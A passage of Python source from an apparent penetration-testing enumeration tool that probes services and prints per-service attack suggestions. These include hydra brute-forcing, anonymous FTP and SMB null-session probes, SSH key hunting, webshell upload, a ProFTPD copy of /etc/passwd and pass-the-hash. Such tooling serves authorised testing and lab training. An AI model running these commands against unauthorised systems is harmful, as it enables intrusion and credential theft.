                    _sub("robots.txt")
                    _w(pr.robots.snippet[:8000])
                if pr.cms_version_files:
                    _sub("CMS version files")
                    for vpath, vinfo in pr.cms_version_files.items():
                        _w(f"    {vpath}: {vinfo}")
                if pr.searchsploit_results:
                    _sub(f"Searchsploit matches ({len(pr.searchsploit_results)})")
                    for line in pr.searchsploit_results[:20]: _w(f"    {line}")
                # Next-step commands
                if pr.url and not brief:
                    _qw = build_web_quickwins(pr)
                    if _qw:
                        _sub("Recommended next commands")
                        _n = 0
                        for _c in _qw:
                            if _c.startswith("#"):
                                _w(f"  {_c}")
                            else:
                                _n += 1
                                _w(f"  [{_n}] {_c}")

            # ── UDP ──────────────────────────────────────────────────────────────
            _sec("UDP OPEN / OPEN|FILTERED")
            if udp_results:
                for port, st in sorted(udp_results, key=lambda x: x[0]):
                    _w(f"  {port}/udp  {st}  {COMMON_SERVICES.get(port,'Unknown')}")
            else:
                _w("  (no UDP hits)")

            # ── Discovered hostnames ─────────────────────────────────────────────
            all_hn = HOSTNAME_CACHE.get("all", set())
            if all_hn:
                _sec("DISCOVERED HOSTNAMES")
                for hn in sorted(all_hn):
                    srcs = []
                    if hn in HOSTNAME_CACHE.get("etc_hosts", set()): srcs.append("/etc/hosts")
                    if hn in HOSTNAME_CACHE.get("redirects",  set()): srcs.append("redirect")
                    if hn in HOSTNAME_CACHE.get("ssl_certs",  set()): srcs.append("SSL cert")
                    _w(f"  {hn}" + (f"  ({', '.join(srcs)})" if srcs else ""))

            # ── Ident ────────────────────────────────────────────────────────────
            if ident_results:
                _sec("IDENT ENUMERATION (port 113)")
                for p, user in sorted(ident_results.items()):
                    _w(f"  Port {p} → {user}")

            # ── Footer ───────────────────────────────────────────────────────────
            _sec("END OF REPORT")
            _w(f"  Scan time  : {scan_elapsed}")
            _w(f"  Generated  : {_dt.now().strftime('%Y-%m-%d %H:%M:%S')}")

        with print_lock:
            print(f"{C.GREEN}Saved report: {output_path}{C.END}")
    except Exception as e:
        with print_lock:
            print(f"{C.RED}[!] Failed to save report: {e}{C.END}")


def print_nonhttp_block(host: str, pr: PortResult):
    svc = pr.detected_service or pr.service_guess
    _os = OS_GUESS.get("os", "Unknown")
    _is_windows = "Windows" in _os
    _is_linux = "Linux" in _os or "Unix" in _os
    _is_seq = not sys.stdout.isatty()

    _primary_domain = DISCOVERY_CACHE.get("primary_domain", "")
    _dom  = _primary_domain if _primary_domain else "DOMAIN"
    _dc   = (",".join(f"dc={p}" for p in _primary_domain.split("."))) if _primary_domain else "dc=DOMAIN,dc=COM"
    _netbios = _primary_domain.split(".")[0].upper() if _primary_domain else "DOMAIN"

    # Only print the nc banner-grab command in TTY/parallel mode.
    # In sequential mode, core.py already printed "$ nc -nv HOST PORT" before enrich_open_port().
    if not _is_seq:
        if svc == "SSH":
            print(f"  {C.GREY}> nc -nv {host} {pr.port}  # banner grab{C.END}")
        elif svc == "FTP" or pr.port == 21:
            print(f"  {C.GREY}> nc -nv {host} {pr.port}  # banner grab (look for version + anonymous){C.END}")
        elif svc in ("SMTP",) or pr.port in (25, 587):
            print(f"  {C.GREY}> nc -nv {host} {pr.port}  # banner + EHLO test{C.END}")
        elif svc == "Ident" or pr.port == 113:
            print(f"  {C.GREY}> nc -nv {host} 113  # then send: <remote_port>, <local_port>{C.END}")
        else:
            print(f"  {C.GREY}> nc -nv {host} {pr.port}  # banner grab{C.END}")

    if pr.banner or pr.banner_raw:
        # Use banner_raw (exact bytes decoded with \n preserved) for faithful display.
        # Falls back to pr.banner (single-line) if raw not available.
        _display = pr.banner_raw if pr.banner_raw else pr.banner
        _lines = _display.splitlines()
        if len(_lines) > 1:
            print(f"  {C.CYAN}Banner:{C.END}")
            for _bl in _lines[:50]:
                print(f"  {C.WHITE}{_bl}{C.END}")
            if len(_lines) > 50:
                print(f"  {C.DIM}  ... ({len(_lines)} lines total){C.END}")
        else:
            _single = (_lines[0] if _lines else pr.banner)[:200]
            print(f"  {C.CYAN}Banner:{C.END} {C.WHITE}{_single}{C.END}")

    # If we loaded Nmap context (XML or tee output), show brief reference
    if NMAP_CONTEXT.get("loaded") and pr.port in NMAP_PORT_HINTS:
        src = os.path.basename(NMAP_CONTEXT.get("source") or "")
        nh = nmap_hint_banner(pr.port)
        if nh:
            print(f"  {C.GREY}📋 Nmap: {nh} (from {src}){C.END}")

    hint = get_port_hint(pr.port)
    if hint and svc == "Unknown":
        print(f"  {C.YELLOW}⚡ {hint}{C.END}")

    # === Auto-searchsploit for banner versions ===
    if pr.banner and shutil.which("searchsploit"):
        sp_results = auto_searchsploit({}, pr.banner)
        if sp_results:
            print(f"  {C.RED}⚡ SEARCHSPLOIT MATCHES:{C.END}")
            for line in sp_results[:6]:
                print(f"    {line[:180]}")

    # === Comprehensive quick-win commands per service (no nmap) ===
    if svc == "SSH":
        print(f"  {C.GREY}>> ssh -p {pr.port} {host}  # try: root / admin / user{C.END}")
        print(f"  {C.GREY}>> ssh administrator@{host} -p {pr.port}  # common admin account{C.END}")
        print(f"  {C.GREY}>> ssh -i id_rsa user@{host} -p {pr.port}  # if you found a private key{C.END}")
        print(f"  {C.GREY}>> ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no user@{host} -p {pr.port}  # ignore key check{C.END}")
        print(f"  {C.GREY}# --- Old/weak key algorithms (try when connection is refused due to algos) ---{C.END}")
        print(f"  {C.GREY}>> ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa user@{host} -p {pr.port}{C.END}")
        print(f"  {C.GREY}# --- Crack encrypted SSH key ---{C.END}")
        print(f"  {C.GREY}>> ssh2john id_rsa > id_rsa.hash && john --wordlist={WL.get('rockyou','/usr/share/wordlists/rockyou.txt')} id_rsa.hash{C.END}")
        print(f"  {C.GREY}# --- Convert PuTTY key (.ppk) to OpenSSH ---{C.END}")
        print(f"  {C.GREY}>> puttygen id_rsa.ppk -O private-openssh -o id_rsa && chmod 600 id_rsa{C.END}")
        print(f"  {C.GREY}# --- Find keys on target (after shell) ---{C.END}")
        print(f"  {C.GREY}  find /home -name 'id_rsa' -o -name 'id_ecdsa' -o -name 'id_ed25519' 2>/dev/null{C.END}")
        print(f"  {C.GREY}  find /root /home -name 'authorized_keys' 2>/dev/null{C.END}")
        print(f"  {C.GREY}  find /etc/ssh -name '*.pub' 2>/dev/null{C.END}")
        print(f"  {C.GREY}# --- Brute force ---{C.END}")
        print(f"  {C.GREY}>> hydra -l root -P {WL.get('rockyou','/usr/share/wordlists/rockyou.txt')} ssh://{host}:{pr.port} -t 4{C.END}")
        print(f"  {C.GREY}>> hydra -L users.txt -P passwords.txt {host} ssh -t 4 -e nsr  # nsr = null/same/reversed{C.END}")
        print(f"  {C.GREY}>> hydra -f -V -C /usr/share/seclists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt -s {pr.port} {host} ssh{C.END}")
        print(f"  {C.GREY}# --- Nmap deep scripts ---{C.END}")
        print(f"  {C.GREY}>> nmap -p {pr.port} --script ssh-hostkey,ssh-auth-methods,ssh2-enum-algos {host}{C.END}")
        print(f"  {C.GREY}>> ssh-audit {host}:{pr.port}  # check weak algos/vulns{C.END}")
        # Version-specific hints
        if pr.banner:
            bl = pr.banner.lower()
            if "openssh" in bl:
                print(f"  {C.GREY}>> searchsploit openssh  # check version CVEs{C.END}")
                m = re.search(r"openssh[_-]([\d.p]+)", bl)
                if m:
                    ver = m.group(1)
                    major_minor = ver.split(".")[:2]
                    try:
                        major = int(major_minor[0])
                        minor = int(major_minor[1].replace("p", "").split("p")[0]) if len(major_minor) > 1 else 0
                    except ValueError:
                        major, minor = 0, 0
                    if major < 7 or (major == 7 and minor <= 6):
                        print(f"  {C.YELLOW}  ⚡ OpenSSH {ver} - check: ssh user enum (CVE-2018-15473){C.END}")
                    if major < 7 or (major == 7 and minor < 1):
                        print(f"  {C.YELLOW}  ⚡ OpenSSH {ver} - may be vulnerable to CVE-2016-6515 (MaxAuthTries bypass){C.END}")
                    if "debian" in bl or "ubuntu" in bl:
                        print(f"  {C.GREY}  OS hint: {pr.banner.split('|')[0].strip()}{C.END}")
            if "libssh" in bl:
                print(f"  {C.RED}  ⚡ libssh detected - check CVE-2018-10933 (auth bypass!){C.END}")
                print(f"  {C.GREY}>> searchsploit libssh{C.END}")

    elif svc == "FTP" or pr.port == 21:
        if RUNTIME_OPTS.get("do_active_probes", True) and shutil.which("python3"):
            try:
                print(f"  {C.GREY}$ ftp {host} {pr.port}  # probe: anonymous login (empty/anonymous@/anonymous){C.END}")
                if pr.port not in PROBE_CACHE["ftp_anon"]:
                    PROBE_CACHE["ftp_anon"][pr.port] = probe_ftp_anon(host, pr.port, timeout=4.0)
                ftp_info = PROBE_CACHE["ftp_anon"][pr.port]
                if ftp_info.get("anon_allowed"):
                    msg = f"{C.GREEN}✓ anonymous login allowed{C.END}"
                    if ftp_info.get("writable"):
                        msg += f"  {C.RED}⚡ WRITABLE — upload shell!{C.END}"
                    print(f"  {C.GREEN}Active check:{C.END} {msg}")
                    print(f"  {C.GREEN}Next:{C.END} {C.GREY}wget --no-passive -m ftp://anonymous:anonymous@{host}  # mirror all{C.END}")
                    print(f"       {C.GREY}ftp {host} {pr.port}  # interactive: ls -la, get <file>{C.END}")
                else:
                    print(f"  {C.ORANGE}  ✗ Anonymous login: DENIED (tried empty / anonymous / anonymous@){C.END}")
                    print(f"  {C.GREY}    ftp {host} {pr.port}  # try manually with other creds{C.END}")
            except Exception:
                pass
        print(f"  {C.GREY}>> ftp {host} {pr.port}  # try: anonymous / anonymous{C.END}")
        print(f"  {C.GREY}>> ftp -A {host}  # active mode (bypass NAT/firewall issues){C.END}")
        print(f"  {C.GREY}>> filezilla ftp://anonymous:anonymous@{host}/  # GUI: Server→Force showing hidden files{C.END}")
        print(f"  {C.GREY}>> lftp anonymous@{host}  # use 'ls -la' NOT 'ls' — hidden files!{C.END}")
        print(f"  {C.GREY}# --- Download all files ---{C.END}")
        print(f"  {C.GREY}>> wget -m ftp://anonymous:anonymous@{host}  # mirror recursively{C.END}")
        print(f"  {C.GREY}>> wget --no-passive -m ftp://anonymous:anonymous@{host}  # if PASV fails{C.END}")
        print(f"  {C.GREY}>> wget -r ftp://USER:PASS@{host}/  # mirror with credentials{C.END}")
        print(f"  {C.GREY}>> lftp -e 'set ftp:passive-mode false; mirror --parallel=10 --verbose; bye' -u anonymous,anonymous {host}  # fast{C.END}")
        print(f"  {C.GREY}  After download: grep -RniE 'password|passwd|pwd|user|id_rsa|id_ecdsa|authorized_keys' . 2>/dev/null{C.END}")
        print(f"  {C.GREY}# --- Upload (if writable) ---{C.END}")
        print(f"  {C.YELLOW}  ⚡ If writable: upload webshell to web root, or .ssh/authorized_keys{C.END}")
        print(f"  {C.GREY}  ftp {host} → binary → put shell.php  # upload in binary mode{C.END}")
        print(f"  {C.GREY}# --- Nmap deep scripts ---{C.END}")
        print(f"  {C.GREY}>> nmap --script ftp-anon,ftp-bounce,ftp-syst,ftp-proftpd-backdoor,ftp-vsftpd-backdoor -p {pr.port} {host}{C.END}")
        print(f"  {C.GREY}# --- Brute force ---{C.END}")
        print(f"  {C.GREY}>> hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://{host}:{pr.port}{C.END}")
        print(f"  {C.GREY}>> hydra -l anonymous -P {WL.get('rockyou','/usr/share/wordlists/rockyou.txt')} ftp://{host}:{pr.port}{C.END}")
        print(f"  {C.YELLOW}  ⚡ Permissions easy to change via FileZilla (right-click → File permissions){C.END}")
        if pr.banner:
            bl = pr.banner.lower()
            if "vsftpd 2.3.4" in bl:
                print(f"  {C.RED}  ⚡ vsftpd 2.3.4 backdoor! searchsploit vsftpd 2.3.4{C.END}")
            elif "vsftpd" in bl:
                print(f"  {C.GREY}>> searchsploit vsftpd{C.END}")
            if "proftpd" in bl:
                m = re.search(r"proftpd\s+([\d.]+)", bl)
                ver = m.group(1) if m else ""
                print(f"  {C.YELLOW}  ⚡ ProFTPD {ver} - check: searchsploit proftpd {ver}{C.END}")
                if ver.startswith("1.3.3") or ver.startswith("1.3.5"):
                    print(f"  {C.RED}  ⚡ ProFTPD {ver} - SITE CPFR/CPTO mod_copy (file copy w/o auth!){C.END}")
                    print(f"  {C.GREY}>> nc {host} {pr.port} <<< $'SITE CPFR /etc/passwd\\nSITE CPTO /tmp/passwd_copy'{C.END}")

    elif svc == "Telnet" or pr.port == 23:
        print(f"  {C.GREY}>> telnet {host} {pr.port}{C.END}")
        print(f"  {C.GREY}>>   # Try: GET / HEAD / OPTIONS / POST / PUT{C.END}")
        print(f"  {C.GREY}>> nmap -p {pr.port} --script telnet-ntlm-info {host}  # banner + NTLM challenge info{C.END}")
        print(f"  {C.GREY}>> hydra -l admin -P {WL.get('rockyou','/usr/share/wordlists/rockyou.txt')} telnet://{host}:{pr.port}{C.END}")
        print(f"  {C.GREY}>> sudo tcpdump -i tun0 -A 'tcp port 23 and not src host $(hostname -I | cut -d\" \" -f1)'  # capture cleartext{C.END}")

    elif svc == "SMTP" or pr.port in (25, 587):
        print(f"  {C.GREY}>> nc -nv {host} {pr.port}  # manual: EHLO test.com → VRFY root → EXPN{C.END}")
        print(f"  {C.GREY}>> telnet {host} {pr.port}  # alternative; type: EHLO ALL  then  VRFY root{C.END}")
        print(f"  {C.GREY}# --- User enumeration ---{C.END}")
        print(f"  {C.GREY}>> smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t {host} -p {pr.port}{C.END}")
        print(f"  {C.GREY}>> smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -t {host} -p {pr.port} | tee smtp-user-enum.out{C.END}")
        print(f"  {C.GREY}>> smtp-user-enum -M RCPT -U users.txt -t {host} -p {pr.port}{C.END}")
        print(f"  {C.GREY}# Parse results into users.txt:{C.END}")
        print(f"  {C.GREY}  awk -F': ' '/exists$/ {{print $2}}' smtp-user-enum.out | awk '{{print $1}}' | sort -u > users-smtp.txt && cat users-smtp.txt{C.END}")
        print(f"  {C.GREY}# Reuse SMTP-validated users on SSH and other services:{C.END}")
        print(f"  {C.GREY}>> hydra -L users-smtp.txt -e nsr smtp://{host}  # null/same/reversed password{C.END}")
        print(f"  {C.GREY}>> hydra -L users-smtp.txt -e nsr ssh://{host}  # try same users on SSH{C.END}")
        print(f"  {C.GREY}>> swaks --to root@{host} --from test@test.com --server {host}:{pr.port}  # test mail delivery{C.END}")
        if pr.port == 25:
            print(f"  {C.GREY}  Also check port 587 (SMTP submission): nc -nv {host} 587{C.END}")
        print(f"  {C.GREY}# --- Nmap deep scripts ---{C.END}")
        print(f"  {C.GREY}>> nmap --script smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p {pr.port} {host}{C.END}")
        print(f"  {C.GREY}>> nmap -p {pr.port} --script smtp-enum-users --script-args smtp-enum-users.methods={{VRFY,EXPN,RCPT}} {host}{C.END}")
        if pr.banner:
            bl = pr.banner.lower()
            if "postfix" in bl:
                print(f"  {C.YELLOW}  ⚡ Postfix detected - check: searchsploit postfix + Shellshock via SMTP headers{C.END}")
                print(f"  {C.GREY}  # Shellshock check: nmap -sV -p {pr.port} --script http-shellshock --script-args uri=/cgi-bin/test.sh {host}{C.END}")
            if "exim" in bl:
                m_e = re.search(r"exim\s+([\d.]+)", bl)
                ver_e = m_e.group(1) if m_e else ""
                print(f"  {C.RED}  ⚡ Exim {ver_e} - many RCE CVEs! searchsploit exim {ver_e}{C.END}")
            if "dovecot" in bl:
                print(f"  {C.GREY}>> searchsploit dovecot  # CVE-2019-11500, CVE-2018-19518{C.END}")
            if "sendmail" in bl:
                print(f"  {C.GREY}>> searchsploit sendmail{C.END}")
        print(f"  {C.YELLOW}  ⚡ If VRFY works: validate usernames → spray POP3/IMAP/SSH with found users{C.END}")

    elif svc == "POP3" or pr.port in (110, 995):
        is_ssl_pop = pr.port == 995 or pr.is_ssl
        print(f"  {C.GREY}>> telnet {host} {pr.port}  # or use openssl for POP3S{C.END}")
        print(f"  {C.GREY}>>   USER admin{C.END}")
        print(f"  {C.GREY}>>   PASS admin{C.END}")
        print(f"  {C.GREY}>>   LIST          # list messages{C.END}")
        print(f"  {C.GREY}>>   RETR 1        # read message 1{C.END}")
        print(f"  {C.GREY}>>   RETR 2        # read message 2{C.END}")
        if is_ssl_pop:
            print(f"  {C.GREY}>> openssl s_client -connect {host}:{pr.port} -quiet  # POP3S{C.END}")
        print(f"  {C.GREY}>> hydra -l admin -P {WL.get('rockyou','/usr/share/wordlists/rockyou.txt')} {host} pop3 -s {pr.port}{C.END}")
        print(f"  {C.GREY}>> hydra -L users-smtp.txt -e nsr {host} pop3 -s {pr.port}  # use SMTP-validated users{C.END}")
        if pr.banner:
            bl = pr.banner.lower()
            if "dovecot" in bl:
                print(f"  {C.GREY}>> searchsploit dovecot  # CVE-2019-11500, CVE-2018-19518{C.END}")
        print(f"  {C.YELLOW}  ⚡ After login: LIST → RETR each message → search for creds/keys/hostnames{C.END}")

    elif svc == "IMAP" or svc == "IMAPS" or pr.port in (143, 993):
        is_ssl_imap = pr.port == 993 or pr.is_ssl
        if is_ssl_imap:
            print(f"  {C.GREY}>> openssl s_client -connect {host}:{pr.port} -quiet  # IMAPS{C.END}")
        else:
            print(f"  {C.GREY}>> nc {host} {pr.port}{C.END}")
        print(f"  {C.GREY}>>   tag login user@localhost password{C.END}")
        print(f"  {C.GREY}>>   tag LIST \"\" \"*\"                # list all mailboxes{C.END}")
        print(f"  {C.GREY}>>   tag SELECT INBOX               # open inbox{C.END}")
        print(f"  {C.GREY}>>   tag STATUS INBOX (MESSAGES)    # count messages{C.END}")
        print(f"  {C.GREY}>>   tag fetch 1 (BODY[1])          # read first message body{C.END}")
        print(f"  {C.GREY}>>   tag fetch 1:5 BODY[HEADER] BODY[1]  # read headers + body of msg 1-5{C.END}")
        print(f"  {C.GREY}>> hydra -l admin -P {WL.get('rockyou','/usr/share/wordlists/rockyou.txt')} {host} imap -s {pr.port}{C.END}")
        print(f"  {C.GREY}>> hydra -L users-smtp.txt -e nsr {host} imap -s {pr.port}  # use SMTP-validated users{C.END}")
        if pr.banner:
            bl = pr.banner.lower()
            if "dovecot" in bl:
                print(f"  {C.GREY}>> searchsploit dovecot  # CVE-2019-11500, CVE-2018-19518{C.END}")
        print(f"  {C.YELLOW}  ⚡ After login: LIST → SELECT INBOX → fetch messages → search for creds/SSH keys{C.END}")

    elif svc == "Ident" or pr.port == 113:
        print(f"  {C.YELLOW}  ⚡ IDENT reveals usernames running services on other ports!{C.END}")
        print(f"  {C.YELLOW}  ⚡ Full ident enumeration runs after scan completes (needs all open ports){C.END}")
        print(f"  {C.GREY}>> ident-user-enum {host} 22 80 443 445 3306  # query specific ports{C.END}")
        print(f"  {C.GREY}  Usernames found → use for SSH/SMB/DB brute-force{C.END}")

    elif svc == "Finger" or pr.port == 79:
        print(f"  {C.YELLOW}  ⚡ Finger reveals logged-in users and user info!{C.END}")
        print(f"  {C.GREY}>> finger @{host}  # list all users{C.END}")
        print(f"  {C.GREY}>> finger root@{host}  # query specific user{C.END}")
        print(f"  {C.GREY}>> finger admin@{host}{C.END}")
        print(f"  {C.GREY}>> finger-user-enum.pl -U /usr/share/wordlists/metasploit/unix_users.txt -t {host}{C.END}")

    elif svc in ("SMB", "NetBIOS-SSN") or pr.port in (139, 445):
        print(f"  {C.RED}⚡ SMB — HIGH VALUE TARGET{C.END}")

        # ── 1. Share enumeration: smbclient first, then smbmap for permissions ──
        if RUNTIME_OPTS.get("do_active_probes", True) and not PROBE_CACHE.get("smb_null_done"):
            PROBE_CACHE["smb_null_done"] = True

            # Step A: smbclient to list shares (most reliable null session tool)
            _smb_out = ""
            _null_shares_found = []
            if shutil.which("smbclient"):
                try:
                    print(f"  {C.GREY}$ smbclient -L //{host} -N  # null session share list{C.END}", flush=True)
                    _smb_r = subprocess.run(
                        ["smbclient", "-L", f"//{host}", "-N", "--timeout=5"],
                        capture_output=True, text=True, timeout=10
                    )
                    _smb_out = (_smb_r.stdout or "") + (_smb_r.stderr or "")
                    PROBE_CACHE["smb_null_out"] = _smb_out
                    if "Sharename" in _smb_out or "IPC$" in _smb_out:
                        for _sl in _smb_out.splitlines():
                            if any(x in _sl for x in ("Disk", "IPC", "Print", "SYSVOL", "NETLOGON")):
                                _null_shares_found.append(_sl.strip())
                        print(f"  {C.GREEN}⚡ NULL SESSION — shares:{C.END}")
                        for _sf in _null_shares_found:
                            print(f"    {C.WHITE}{_sf}{C.END}")
                    elif any(x in _smb_out for x in ("DENIED", "FAILURE", "NT_STATUS_ACCESS_DENIED")):
                        print(f"  {C.ORANGE}  ✗ SMB null session: DENIED{C.END}")
                except Exception:
                    pass

            # Step B: smbmap for READ/WRITE permissions (try multiple invocation styles)
            _smbmap_out = ""
            if shutil.which("smbmap"):
                _smbmap_tries = [
                    (["smbmap", "-H", host],                          f"smbmap -H {host}"),
                    (["smbmap", "-H", host, "-u", "", "-p", ""],      f"smbmap -H {host} -u '' -p ''"),
                    (["smbmap", "-H", host, "-u", "guest", "-p", ""], f"smbmap -H {host} -u guest -p ''"),
                ]
                for _scmd, _slabel in _smbmap_tries:
                    try:
                        print(f"  {C.GREY}$ {_slabel}  # share permissions{C.END}", flush=True)
                        _sm_r = subprocess.run(_scmd, capture_output=True, text=True, timeout=12)
                        _out = (_sm_r.stdout or "") + (_sm_r.stderr or "")
                        _has_perms  = any(x in _out for x in ("READ ONLY", "READ, WRITE", "NO ACCESS", "READWRITE"))
                        _has_shares = any(x in _out for x in ("IPC$", "ADMIN$", "SYSVOL", "Disk", "Permissions"))
                        if _has_perms or _has_shares:
                            _smbmap_out = _out
                            PROBE_CACHE["smbmap_null_out"] = _smbmap_out
                            break
                    except Exception:
                        pass

            if _smbmap_out:
                print(f"  {C.CYAN}Share permissions:{C.END}")
                _rw_shares, _ro_shares = [], []
                for _sl in _smbmap_out.splitlines():
                    _s = _sl.strip()
                    if not _s or _s.startswith("[") or _s.startswith("-") or "----" in _s:
                        continue
                    if _s.startswith("IP:") or "Trying" in _s or "Working" in _s:
                        continue
                    _has_perm = any(x in _s for x in ("READ", "NO ACCESS", "WRITE", "Disk", "IPC"))
                    if not _has_perm:
                        continue
                    if "READ, WRITE" in _s or "READWRITE" in _s or ("READ" in _s and "WRITE" in _s and "NO ACCESS" not in _s):
                        print(f"  {C.RED}  ⚡ {_s}{C.END}  {C.RED}← READ/WRITE{C.END}")
                        _sn = _s.split()[0]; _rw_shares.append(_sn) if _sn else None
                    elif "READ ONLY" in _s or ("READ" in _s and "WRITE" not in _s and "NO ACCESS" not in _s):
                        print(f"  {C.YELLOW}  → {_s}{C.END}  {C.YELLOW}← READ{C.END}")
                        _sn = _s.split()[0]; _ro_shares.append(_sn) if _sn else None
                    elif "NO ACCESS" in _s:
                        print(f"  {C.DIM}  ✗ {_s}{C.END}")
                    else:
                        print(f"  {C.DIM}    {_s}{C.END}")
                if _rw_shares:
                    print(f"\n  {C.RED}⚡ WRITABLE — upload webshell/authorized_keys:{C.END}")
                    for _sh in _rw_shares:
                        print(f"    {C.RED}$ smbclient //{host}/{_sh} -N{C.END}  # interactive shell")
                        print(f"    {C.RED}$ smbclient.py ''/''@{host} -no-pass{C.END}  # impacket tree view")
                        print(f"    {C.RED}$ smbmap -H {host} -R {_sh} --depth 5{C.END}")
                if _ro_shares:
                    print(f"\n  {C.YELLOW}Readable — download everything:{C.END}")
                    for _sh in [x for x in _ro_shares if x not in ("IPC$",)]:
                        print(f"    {C.YELLOW}$ smbclient //{host}/{_sh} -N -c 'recurse;ls'{C.END}")
                        print(f"    {C.YELLOW}$ smbclient.py ''/''@{host} -no-pass{C.END}  # impacket tree view")
                        print(f"    {C.YELLOW}$ smbmap -H {host} -R {_sh} --depth 5 -A '.*' -q{C.END}")

        elif PROBE_CACHE.get("smb_null_done"):
            _smbmap_cached = PROBE_CACHE.get("smbmap_null_out", "")
            _smb_cached    = PROBE_CACHE.get("smb_null_out", "")
            if _smbmap_cached and "READ" in _smbmap_cached:
                print(f"  {C.GREY}  ↳ SMB share permissions already listed above{C.END}")
            elif _smb_cached and ("Sharename" in _smb_cached or "IPC$" in _smb_cached):
                print(f"  {C.GREY}  ↳ SMB null session already ran — shares visible{C.END}")
            elif _smb_cached:
                print(f"  {C.ORANGE}  ✗ SMB null session: DENIED (cached){C.END}")

        # ── 2. enum4linux (full SMB/NetBIOS/user enum) ──────────────────────
        if RUNTIME_OPTS.get("do_active_probes", True) and not PROBE_CACHE.get("enum4linux_done"):
            PROBE_CACHE["enum4linux_done"] = True
            _skip_current.clear()
            _e4l_tool = "enum4linux-ng" if shutil.which("enum4linux-ng") else "enum4linux"
            print(f"  {C.GREY}$ {_e4l_tool} -A {host}{C.END}")
            if sys.stdin.isatty():
                print(f"  {C.GREY}  (press any key to skip){C.END}")
            _e4l = run_enum4linux(host, timeout=60)
            if _e4l:
                print(f"  {C.CYAN}enum4linux:{C.END}")
                for _el in _e4l.splitlines()[:30]:
                    col = C.GREEN if any(x in _el for x in ("[+]","Share","Domain","User","Group")) else C.GREY
                    print(f"    {col}{_el[:160]}{C.END}")
        elif PROBE_CACHE.get("enum4linux_done"):
            print(f"  {C.GREY}  ↳ enum4linux already ran — skipping{C.END}")

        # ── 3. Signing check + next steps (non-duplicate, priority ordered) ─
        if _is_windows:
            print(f"  {C.YELLOW}  ⚡ Windows — check SMB signing (relay attacks){C.END}")
        print(f"\n  {C.CYAN}Next steps:{C.END}")
        print(f"  {C.GREY}$ nxc smb {host}  # signing:True/False + OS version{C.END}")
        print(f"  {C.GREY}$ nxc smb {host} -u '' -p '' --shares --users --rid-brute{C.END}")
        print(f"  {C.GREY}$ sudo nbtscan -r {host}/24  # NetBIOS scan for name/workgroup{C.END}")
        print(f"  {C.GREY}$ rpcclient -U '' -N {host} -c 'srvinfo'  # server info{C.END}")
        print(f"  {C.GREY}$ rpcclient -U '' -N {host} -c 'enumdomusers;enumdomgroups;querydispinfo'{C.END}")
        print(f"  {C.GREY}# rpcclient commands (post null session):{C.END}")
        print(f"  {C.GREY}  enumdomusers → queryuser 0x<RID> → queryusergroups 0x<RID>{C.END}")
        print(f"  {C.GREY}  enumdomgroups → querygroupmem 0x<RID> → lsaquery → lookupnames <user>{C.END}")
        print(f"  {C.GREY}  lookupsids S-1-5-21-... → enumprinters → querydominfo{C.END}")
        print(f"  {C.GREY}$ nmap -p 139,445 --script smb-os-discovery {host}  # OS + workgroup{C.END}")
        print(f"  {C.GREY}$ nmap -p 445 --script smb-enum-shares,smb-enum-users {host}{C.END}")
        print(f"  {C.GREY}$ nmap -p 445 --script 'smb-vuln-* and not smb-vuln-regsvc-dos' --script-args unsafe=1 {host}{C.END}")
        print(f"  {C.GREY}$ impacket-rpcdump {host} | grep -i 'MS-' | sort -u{C.END}")
        print(f"  {C.GREY}# With creds:{C.END}")
        print(f"  {C.GREY}$ nxc smb {host} -u USER -p PASS --shares -M spider_plus{C.END}")
        print(f"  {C.GREY}$ smbmap -H {host} -u USER -p PASS -R --depth 5{C.END}")
        print(f"  {C.GREY}$ smbmap -H {host} -u guest -p '' -R  # guest access check{C.END}")
        print(f"  {C.GREY}$ nxc smb {host} -u USER -H NTHASH --shares  # pass-the-hash{C.END}")
        print(f"  {C.YELLOW}  ⚡ SYSVOL → Groups.xml → GPP creds: gpp-decrypt HASH{C.END}")
        print(f"  {C.YELLOW}  ⚡ nxc ldap {host} -u USER -p PASS -M get-desc-users  # passwords in descriptions{C.END}")


    elif svc == "MSRPC" or pr.port == 135:
        print(f"  {C.GREY}>> rpcclient -U '' -N {host} -c 'enumdomusers; enumdomgroups; querydispinfo'{C.END}")
        print(f"  {C.GREY}# rpcclient full command reference:{C.END}")
        print(f"  {C.GREY}  srvinfo → enumdomusers → queryuser 0x<RID> → queryusergroups 0x<RID>{C.END}")
        print(f"  {C.GREY}  enumdomgroups → querygroupmem 0x<RID> → lsaquery → lookupnames <user>{C.END}")
        print(f"  {C.GREY}  lookupsids <SID> → enumprinters → querydominfo → lsaenumsid{C.END}")
        print(f"  {C.GREY}  # Change password (if you have creds): setuserinfo2 USER 23 'NewPass123!'{C.END}")
        print(f"  {C.GREY}>> impacket-rpcdump {host} -p 135  # enumerate RPC endpoints{C.END}")
        print(f"  {C.GREY}>> nmap -p 135 --script msrpc-enum {host}{C.END}")
        print(f"  {C.GREY}>> nxc smb {host} -u '' -p '' --rid-brute{C.END}")

    elif svc == "RPCbind" or pr.port == 111:
        if RUNTIME_OPTS.get("do_active_probes", True):
            try:
                # rpcinfo is the closest OSCP-safe way to learn about 'silent' RPC services (mountd, nfs, etc.)
                print(f"  {C.GREY}> rpcinfo -p {host}  # active probe{C.END}")
                if PROBE_CACHE["rpcinfo"] is None:
                    PROBE_CACHE["rpcinfo"] = probe_rpcinfo(host)
                rrows = PROBE_CACHE["rpcinfo"] or []
                rsum = summarize_rpcinfo(rrows)
                if rsum:
                    print(f"  {C.CYAN}Active check:{C.END} {C.GREEN}✓ rpcinfo returned RPC programs{C.END}")
                    for sline in rsum:
                        if any(k in sline.lower() for k in ("mountd", "nfs", "portmapper", "nlockmgr", "status")):
                            print(f"    {C.WHITE}{sline}{C.END}")
                # Show the exact command that produced the exports result.
                print(f"  {C.GREY}> showmount -e {host}  # active probe{C.END}")
                if PROBE_CACHE["nfs_exports"] is None:
                    PROBE_CACHE["nfs_exports"] = probe_nfs_exports(host)
                exports = PROBE_CACHE["nfs_exports"] or []
                if exports:
                    print(f"  {C.CYAN}Active check:{C.END} {C.GREEN}✓ NFS exports found via showmount{C.END}")
